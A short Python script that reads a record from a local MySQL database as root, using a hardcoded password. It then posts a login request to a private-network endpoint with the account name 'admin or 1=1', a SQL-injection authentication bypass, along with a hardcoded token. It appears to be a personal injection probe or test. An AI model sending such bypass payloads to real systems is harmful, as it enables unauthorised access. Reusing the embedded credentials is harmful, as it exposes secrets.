import pymysql
import requests
import json

db= pymysql.connect('127.0.0.1','root','12345678','bem',charset= 'utf8')
cursor= db.cursor()
cursor.execute('select * from regrecord')
data= cursor.fetchone()
print(data)



def run():
    data= {
	"userid": "",
	"token": "c6aODgxbZzJOQJGWZXDN18WWAxG+oka2ew9y4etQRrjL83LysoWpZc4OaT8QdFm7Cq7S9FVUkSM1HDftlfRF0kqyKNJ5z0I56uAEu+xySRiigiAcv89vgngVFKU6MIaa",
	"gcid": "0371070",
	"params": {
		"gcid": "0371070",
		"accountName": "admin or 1=1",
		"accountPwd": "",
		"mac": "",
		"cpuId": ""
	}
}
    url= 'http://192.168.1.222/v2/jjr_user_login/pc_login_new'
    r= requests.post(url,json.dumps(data))
    print(r.content.decode('utf-8'))


run()